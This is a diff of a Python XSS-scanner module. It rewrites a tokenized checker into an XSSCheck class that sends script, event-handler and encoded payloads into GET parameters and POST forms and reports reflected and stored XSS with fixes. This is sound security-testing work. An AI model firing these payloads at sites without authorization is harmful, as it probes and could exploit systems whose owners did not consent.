@@ -1,118 +1,219 @@
-import urllib.parse as up
 import re
-import random
-import string
+import urllib.parse
 
-def _token():
-    return "XSS" + "".join(random.choices(string.ascii_letters + string.digits, k=10))
+def xss_payloads(base_payloads=None):
+    """
+    Generate XSS payloads:
+    - classic reflected payloads
+    - encoded variants
+    - event-handler payloads
+    - script-based
+    """
+    if base_payloads is None:
+        base_payloads = [
+            "<script>alert(1)</script>",
+            "\"><script>alert(1)</script>",
+            "'><script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "<svg/onload=alert(1)>",
+        ]
 
-PAYLOADS = [
-    '\"><svg onload=alert(1)>',
-    '\"><img src=x onerror=alert(1)>',
-    '\"><script>alert(1)</script>',
-]
+    out = list(base_payloads)
 
-def _update_query(url, extra):
-    pr = up.urlparse(url)
-    qs = dict(up.parse_qsl(pr.query))
-    qs.update(extra)
-    return up.urlunparse((
-        pr.scheme, pr.netloc, pr.path, pr.params,
-        up.urlencode(qs, doseq=True), pr.fragment
-    ))
+    # Encoded variants
+    encoded = [
+        urllib.parse.quote(p) for p in base_payloads
+    ]
+    out.extend(encoded)
+
+    # Event handler payloads
+    event_payloads = [
+        "<body onload=alert(1)>",
+        "<input autofocus onfocus=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+        "<iframe src=javascript:alert(1)>",
+    ]
+    out.extend(event_payloads)
+
+    # Deduplicate
+    seen = set()
+    res = []
+    for p in out:
+        if p not in seen:
+            seen.add(p)
+            res.append(p)
+    return res
+
 
 class XSSCheck:
-    @staticmethod
-    def run(http, params_map):
+    """Cross-Site Scripting (XSS) vulnerability checker."""
+
+    XSS_PAYLOADS = xss_payloads()
+
+    REFLECTION_PATTERNS = [
+        re.compile(r"<script>alert\(1\)</script>", re.I),
+        re.compile(r"onerror=alert\(1\)", re.I),
+        re.compile(r"onload=alert\(1\)", re.I),
+        re.compile(r"alert\(1\)", re.I),
+    ]
+
+    @classmethod
+    def run(cls, http, params_map):
+        """Test GET parameters for reflected XSS vulnerabilities."""
         findings = []
-        for url, params in params_map.items():
-            for p in params:
-                tok = _token()
-                for base in PAYLOADS:
-                    payload = base.replace("1", tok)
-                    try:
-                        r = http.get(_update_query(url, {p: payload}))
-                        body = r.text or ""
-                        if tok in body and re.search(
-                            rf"(<script[^>]*>[^<]*{tok}[^<]*</script>|on\w+\s*=\s*[^>]*{tok})",
-                            body, re.I
-                        ):
-                            findings.append({
-                                "type": "xss:reflected",
-                                "url": url,
-                                "param": p,
-                                "payload": payload,
-                                "evidence": f"Token {tok} muncul di konteks executable.",
-                                "severity_score": 5
-                            })
-                            break
-                    except Exception:
-                        continue
+
+        for url, param_names in params_map.items():
+            for param in param_names:
+                findings.extend(cls._test_parameter(http, url, param))
+
         return findings
 
+    @classmethod
+    def run_forms(cls, http, forms, crawl_pages=None):
+        """
+        Test POST forms for XSS vulnerabilities.
+        - crawl_pages: optional list of (url, resp) pairs to detect stored XSS
+        """
+        findings = []
 
-# =========================
-# Tambahan: XSS via POST forms
-# =========================
+        for form in forms:
+            if form["method"].upper() == "POST":
+                findings.extend(cls._test_form(http, form, crawl_pages))
 
-def _looks_like_csrf(name: str) -> bool:
-    n = name.lower()
-    return ("csrf" in n) or ("xsrf" in n) or ("authenticity_token" in n)
+        return findings
 
-def run_forms(http, forms):
-    """
-    Uji Reflected XSS lewat FORM POST.
-    - Hidden / token (mis. CSRF) dipertahankan nilainya agar validasi form tidak gagal.
-    - Semua field non-hidden diisi payload bertoken untuk mendeteksi pantulan berbahaya.
-    """
-    findings = []
-    for f in forms:
-        if f.get("method") != "POST":
-            continue
+    @classmethod
+    def _test_parameter(cls, http, url, param_name):
+        """Test GET parameter for reflected XSS."""
+        findings = []
 
-        # Baseline data: hidden/CSRF pakai value asli, non-hidden placeholder
-        base_data = {}
-        for inp in f.get("inputs", []):
-            name = inp["name"]
-            if inp["hidden"] or _looks_like_csrf(name):
-                base_data[name] = inp["value"]
-            else:
-                base_data[name] = "test"
-
-        # Payload bertoken
-        tok = _token()
-        payloads = [p.replace("1", tok) for p in PAYLOADS]
-
-        for payload in payloads:
-            data = dict(base_data)
-            # Isi semua non-hidden dengan payload bertoken
-            for inp in f["inputs"]:
-                name = inp["name"]
-                if not (inp["hidden"] or _looks_like_csrf(name)):
-                    data[name] = payload
-
+        for payload in cls.XSS_PAYLOADS:
             try:
-                r = http.post(f["action"], data=data)
-                body = r.text or ""
-                # Token harus muncul di konteks executable (script/handler)
-                if tok in body and re.search(
-                    rf"(<script[^>]*>[^<]*{tok}[^<]*</script>|on\w+\s*=\s*[^>]*{tok})",
-                    body, re.I
-                ):
+                parsed = urllib.parse.urlparse(url)
+                query_params = urllib.parse.parse_qs(parsed.query)
+
+                query_params[param_name] = [payload]
+                new_query = urllib.parse.urlencode(query_params, doseq=True)
+
+                test_url = urllib.parse.urlunparse((
+                    parsed.scheme, parsed.netloc, parsed.path,
+                    parsed.params, new_query, parsed.fragment
+                ))
+
+                response = http.get(test_url)
+
+                if cls._is_vulnerable_reflected(response, payload):
                     findings.append({
-                        "type": "xss:reflected",
-                        "url": f["action"],
-                        "param": ",".join([i["name"] for i in f["inputs"] if not i["hidden"]]),
-                        "payload": "POST form payload (tokenized)",
-                        "evidence": f"Token {tok} muncul dalam konteks executable pada response.",
-                        "severity_score": 5
+                        "type": "XSS (Reflected)",
+                        "severity": "HIGH",
+                        "url": test_url,
+                        "parameter": param_name,
+                        "payload": payload,
+                        "evidence": cls._extract_evidence(response.text, payload),
+                        "description": f"Reflected XSS vulnerability found in parameter '{param_name}'. "
+                                     f"The application reflects user input without proper sanitization.",
+                        "recommendation": "Sanitize user input, use proper output encoding (HTML entity encoding), "
+                                       "and consider Content Security Policy (CSP)."
                     })
-                    break  # satu temuan per form cukup
+                    break
+
             except Exception:
                 continue
 
-    return findings
-try:
-    XSSCheck.run_forms
-except AttributeError:
-    XSSCheck.run_forms = staticmethod(run_forms)
+        return findings
+
+    @classmethod
+    def _test_form(cls, http, form, crawl_pages=None):
+        """Test POST form for XSS (reflected or stored)."""
+        findings = []
+
+        for input_field in form["inputs"]:
+            if input_field["hidden"]:
+                continue
+
+            param_name = input_field["name"]
+
+            for payload in cls.XSS_PAYLOADS:
+                try:
+                    data = {}
+                    for inp in form["inputs"]:
+                        if inp["name"] == param_name:
+                            data[inp["name"]] = payload
+                        else:
+                            data[inp["name"]] = inp["value"]
+
+                    response = http.post(form["action"], data=data)
+
+                    # Reflected XSS check
+                    if cls._is_vulnerable_reflected(response, payload):
+                        findings.append({
+                            "type": "XSS (Reflected - POST)",
+                            "severity": "HIGH",
+                            "url": form["action"],
+                            "form_page": form["page"],
+                            "parameter": param_name,
+                            "payload": payload,
+                            "evidence": cls._extract_evidence(response.text, payload),
+                            "description": f"Reflected XSS vulnerability in form parameter '{param_name}'.",
+                            "recommendation": "Sanitize user input, escape output, enforce CSP."
+                        })
+                        break
+
+                    # Stored XSS check (crawl subsequent pages)
+                    if crawl_pages:
+                        for crawl_url, crawl_resp in crawl_pages:
+                            if cls._is_vulnerable_reflected(crawl_resp, payload):
+                                findings.append({
+                                    "type": "XSS (Stored)",
+                                    "severity": "CRITICAL",
+                                    "url": crawl_url,
+                                    "form_page": form["page"],
+                                    "parameter": param_name,
+                                    "payload": payload,
+                                    "evidence": cls._extract_evidence(crawl_resp.text, payload),
+                                    "description": f"Stored XSS vulnerability detected via parameter '{param_name}'. "
+                                                 f"Payload persisted into {crawl_url}.",
+                                    "recommendation": "Sanitize stored data before rendering, use encoding and CSP."
+                                })
+                                break
+
+                except Exception:
+                    continue
+
+        return findings
+
+    @classmethod
+    def _is_vulnerable_reflected(cls, response, payload):
+        """Check if response reflects the payload unsanitized."""
+        if not response or not response.text:
+            return False
+
+        if payload in response.text:
+            return True
+
+        for pattern in cls.REFLECTION_PATTERNS:
+            if pattern.search(response.text):
+                return True
+
+        return False
+
+    @classmethod
+    def _extract_evidence(cls, response_text, payload):
+        """Extract relevant evidence from response."""
+        if not response_text:
+            return "No response text"
+
+        idx = response_text.find(payload)
+        if idx != -1:
+            start = max(0, idx - 50)
+            end = min(len(response_text), idx + len(payload) + 50)
+            return response_text[start:end]
+
+        for pattern in cls.REFLECTION_PATTERNS:
+            match = pattern.search(response_text)
+            if match:
+                start = max(0, match.start() - 50)
+                end = min(len(response_text), match.end() + 50)
+                return response_text[start:end]
+
+        return "Potential XSS reflection detected"
